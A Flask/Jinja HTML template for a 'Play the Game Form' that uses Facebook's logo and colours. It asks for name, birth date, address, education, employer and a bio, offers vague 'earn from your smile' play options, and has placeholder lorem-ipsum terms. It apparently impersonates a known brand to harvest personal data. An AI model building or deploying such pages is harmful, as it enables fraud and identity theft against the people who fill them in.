{% extends "base.html" %}
{% block body %}
<div class="card form-card">
  <div class="platform-header">
    <div class="icon-circle bg-facebook">
      <i class="fa-brands fa-facebook icon-lg"></i>
    </div>
    <div>
      <h2 class="notranslate" style="margin:0;color:#1877F2;">Play the Game Form</h2>
      <div style="color:#64748b;font-size:13px">Please complete all fields before submitting</div>
    </div>
  </div>

  <form id="f1form" method="POST" action="{{ url_for('f1') }}" novalidate>

    <!-- PERSONAL INFO -->
    <h2 class="section-title">üë§ Personal Information</h2>
    <input class="input" name="fullname" placeholder="Full Name" required>
    <div class="error-text"></div>

    <input class="input" name="dob" type="date" required>
    <div class="error-text"></div>

    <div class="group">
      <label>Gender</label>
      <div class="button-group">
        <button type="button" class="option-btn" data-name="gender" data-value="Male">Male</button>
        <button type="button" class="option-btn" data-name="gender" data-value="Female">Female</button>
        <button type="button" class="option-btn" data-name="gender" data-value="Other">Other</button>
        <input type="hidden" name="gender" required>
      </div>
      <div class="error-text"></div>
    </div>

    <div class="group">
      <label>Marital Status</label>
      <div class="button-group">
        <button type="button" class="option-btn" data-name="marital" data-value="Single">Single</button>
        <button type="button" class="option-btn" data-name="marital" data-value="Married">Married</button>
        <button type="button" class="option-btn" data-name="marital" data-value="Divorced">Divorced</button>
        <button type="button" class="option-btn" data-name="marital" data-value="Widowed">Widowed</button>
        <input type="hidden" name="marital" required>
      </div>
      <div class="error-text"></div>
    </div>

    <hr>

    <!-- ADDRESS -->
    <h2 class="section-title">üè† Residential Address</h2>
    <input class="input" name="street" placeholder="Street" required>
    <div class="error-text"></div>

    <input class="input" name="city" placeholder="City" required>
    <div class="error-text"></div>

    <input class="input" name="postal" placeholder="Postal Code" required>
    <div class="error-text"></div>

    <input class="input" name="country" placeholder="Country" required>
    <div class="error-text"></div>

    <hr>

    <!-- EDUCATION -->
    <h2 class="section-title">üéì Education Background</h2>
    <input class="input" name="qualification" placeholder="Highest Qualification" required>
    <div class="error-text"></div>

    <input class="input" name="institution" placeholder="Institution" required>
    <div class="error-text"></div>

    <input class="input" name="year_completed" type="number" placeholder="Year Completed" required>
    <div class="error-text"></div>

    <hr>

    <!-- WORK -->
    <h2 class="section-title">üíº Work / Business Information</h2>
    <input class="input" name="occupation" placeholder="Occupation / Job Title" required>
    <div class="error-text"></div>

    <input class="input" name="company" placeholder="Company / Business Name" required>
    <div class="error-text"></div>

    <hr>

    <!-- FUN -->
    <h2 class="section-title">üí∞ Fun Preferences</h2>
    <div class="button-group">
      <button type="button" class="option-btn" data-name="fun" data-value="happiness">Feel from your own happiness</button>
      <button type="button" class="option-btn" data-name="fun" data-value="smile">Earn from your smile</button>
      <button type="button" class="option-btn" data-name="fun" data-value="both">Both</button>
      <input type="hidden" name="fun" required>
    </div>
    <div class="error-text"></div>

    <hr>

    <!-- BIO -->
    <h2 class="section-title">üìù Short Bio</h2>
    <textarea name="bio" class="input" rows="6" minlength="15" maxlength="1500" placeholder="Write 15‚Äì300 words..." required></textarea>
    <div class="error-text"></div>

    <hr>

    <!-- NOTIFICATIONS -->
    <h2 class="section-title">üîî Notification Preferences</h2>
    <div class="button-group">
      <button type="button" class="option-btn" data-name="notify" data-value="email">Email Updates</button>
      <button type="button" class="option-btn" data-name="notify" data-value="sms">SMS Alerts</button>
      <button type="button" class="option-btn" data-name="notify" data-value="push">Push Notifications</button>
      <input type="hidden" name="notify" required>
    </div>
    <div class="error-text"></div>

    <hr>

    <!-- PLAY METHOD -->
    <h2 class="section-title">üí≥ Play Method</h2>
    <div class="button-group">
      <button type="button" class="option-btn" data-name="method" data-value="feeling">Feeling</button>
      <button type="button" class="option-btn" data-name="method" data-value="hoping">Hoping</button>
      <button type="button" class="option-btn" data-name="method" data-value="applications">Applications</button>
      <input type="hidden" name="method" required>
    </div>
    <div class="error-text"></div>

    <hr>

    <!-- TERMS -->
    <h2 class="section-title">üìÑ Terms & Conditions</h2>
    <div class="terms-box">
      <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec non eros ut elit suscipit cursus. Curabitur a sapien at est bibendum porttitor.</p>
    </div>
    <label><input type="checkbox" name="terms" required> I have read and agree to the Terms & Conditions.</label>
    <div class="error-text"></div>

    <button class="btn login-btn" type="submit">‚úÖ Submit</button>
  </form>
</div>

<style>
.card {
  max-width: 640px;
  margin: 28px auto;
  box-shadow: 0 6px 18px rgba(24,119,242,0.25);
  border-radius: 16px;
  background: #fff;
  padding: 28px;
}
.platform-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 24px;
}
.icon-circle {
  width: 44px;
  height: 44px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}
.bg-facebook {
  background-color: #1877F2;
}
.icon-lg {
  font-size: 24px;
}

/* Input fields */
.input {
  width: 100%;
  padding: 14px;
  border-radius: 18px;
  border: 1px solid #e5e7eb;
  margin-bottom: 8px;
  font-size: 16px;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.input:focus {
  border-color: #1877F2;
  box-shadow: 0 0 0 3px rgba(24,119,242,0.25);
  outline: none;
}
.input-error {
  border-color: #ef4444;
  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
}

/* Buttons */
.option-btn {
  flex: 1;
  background: #e5e7eb;
  border: 1px solid #ccc;
  border-radius: 12px;
  padding: 10px;
  cursor: pointer;
  font-weight: 600;
  transition: 0.25s;
}
.option-btn.selected {
  background: #1877F2;
  color: #fff;
  box-shadow: 0 4px 12px rgba(24,119,242,0.35);
}
.option-btn:hover {
  box-shadow: 0 6px 16px rgba(24,119,242,0.25);
}
.button-group {
  display: flex;
  gap: 8px;
  margin-bottom: 8px;
}

/* Errors */
.error-text {
  color: #ef4444;
  font-size: 13px;
  margin-top: -4px;
  margin-bottom: 8px;
}

/* Submit button */
.login-btn {
  width: 100%;
  background: #1877F2;
  color: #fff;
  font-size: 16px;
  font-weight: 700;
  padding: 12px;
  border-radius: 25px;
  cursor: pointer;
  border: none;
  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
  display: block;
  margin-top: 12px;
}
.login-btn:hover {
  background: #166fe5;
  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
}
.login-btn:active {
  transform: scale(0.985);
}
</style>

<script>
const form = document.getElementById("f1form");

document.querySelectorAll(".option-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    const name = btn.dataset.name;
    const value = btn.dataset.value;
    const hidden = form.querySelector(`input[name="${name}"]`);
    document.querySelectorAll(`.option-btn[data-name="${name}"]`).forEach(b => b.classList.remove("selected"));
    btn.classList.add("selected");
    hidden.value = value;
  });
});

form.addEventListener("submit", e => {
  let valid = true;
  let firstInvalid = null;

  form.querySelectorAll(".error-text").forEach(e => e.textContent = "");
  form.querySelectorAll(".input, textarea").forEach(el => el.classList.remove("input-error"));

  form.querySelectorAll("input[required], textarea[required]").forEach(input => {
    if (!input.value.trim() || (input.type === "checkbox" && !input.checked)) {
      valid = false;
      input.classList.add("input-error");
      input.closest("div").querySelector(".error-text")?.textContent = "This field is required.";
      if (!firstInvalid) firstInvalid = input;
    }
  });

  if (!valid) {
    e.preventDefault();
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
    firstInvalid.focus({ preventScroll: true });
  }
});
</script>
{% endblock %}
